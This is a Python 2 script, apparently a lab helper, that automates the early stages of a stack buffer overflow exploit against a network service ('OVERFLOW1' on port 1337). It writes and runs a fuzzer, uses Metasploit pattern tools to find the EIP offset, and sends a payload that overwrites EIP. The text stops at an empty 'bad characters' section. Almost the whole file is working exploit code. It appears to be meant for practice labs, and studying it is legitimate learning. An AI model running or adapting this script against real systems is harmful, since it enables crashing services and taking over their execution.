#!/usr/bin/python


##### Need to run the exploit as Python2 and not Python 3

import time
import os
import sys
import socket


print("Stack BOF Solver")
print("")

print("This program is designed to help guide you through basic Stack Buffer")
print("Overflow exploit development.")
print("You will still need to debug the vulnerable program with a debugger like")
print("Immunity.  Note that this is NOT an automated solver... You will need")
print("to have knowledge of how BOF's work.")

line = "\n" + "#" * 60 + "\n"

print(line)

################# Building the Fuzzer ########################

print("Find the vulnerable program and spike it to determine vulnerable command.")
print("Use netcat...   'nc <ip> <port>'")
print("")
#command = raw_input("What command seems to be vulnerable? ")
#ip = raw_input("IP address of machine running vulnerable program? ")
#port = raw_input("Port the program is running on? ")
command = "OVERFLOW1 "
ip = "10.10.93.60"
port = "1337"

print(line)

print("Building Fuzzing Script")
time.sleep(1)

fuzzer1 = "#!/usr/bin/python\n\nimport sys\nimport socket\nimport time\n\nbuffer = 'A' * 100\n\nwhile True:\n   try:\n      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n      s.connect(('{ip}',{port}))\n     s.send(('{cmd}' + buffer))\n        s.close()\n     time.sleep(1)\n     buffer = buffer + 'A' * 100\n   except:\n       print('Fuzzing crashed at %s bytes' % str(len(buffer)))\n       sys.exit()\n".format(ip=ip, port=port, cmd=command)

os.system("rm fuzzer1.py 2>/dev/null")
fuzzer1_file = open("fuzzer1.py", "a")
fuzzer1_file.write(fuzzer1)
fuzzer1_file.close()

print("Running Fuzzing Script")
print("")


buffer = "A" * 1800
loop = True

while loop == True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, int(port)))

        s.send((command + buffer + "\r\n"))
        s.close()
        time.sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        loop = False


################### Finding the Offset ###########################
print(line)

print("Finding The Offset")
print("")

pause = raw_input("Restart Application and Press Enter to continue...")
print("")

buffer_len = len(buffer)
find_offset = os.system("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {buffer} > offset.txt 2>/dev/null".format(buffer=buffer_len))

offset_file = open("offset.txt", "r")
offset = offset_file.read()
offset_file.close()

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + offset + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()


#eip = raw_input("What is the value of the EIP? ")
eip = "6F43396E"

find_offset = os.system("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {buffer} -q {eip} > offset.txt 2>/dev/null".format(buffer=buffer_len, eip=eip))

offset_file = open("offset.txt", "r")
offset = offset_file.read()
offset_file.close()

offset_found = offset.split(' ')[1]
if offset_found == "Exact":
    find_offset_len = offset.split(' ')[5]
    print("Offset found at {offset}".format(offset=find_offset_len))
else:
    print("Offset was not found.  Exiting.")
    sys.exit()

########### Testing the Offset ################

print(line)

print("Testing The Offset")
print("")

pause = raw_input("Restart Application and Press Enter to continue...")
print("")


test_eip = "A" * int(find_offset_len) + "B" * 4

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    s.send((command + test_eip + "\r\n"))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()

test_result = raw_input("Was the EIP overwrote with 4 B's? (Y or N) ")

if test_result == "Y" or test_result == "y":
    pass
else:
    print("Something went wrong.. Exiting")
    sys.exit()


################# Finding Bad Charactors ##########################
























# Space
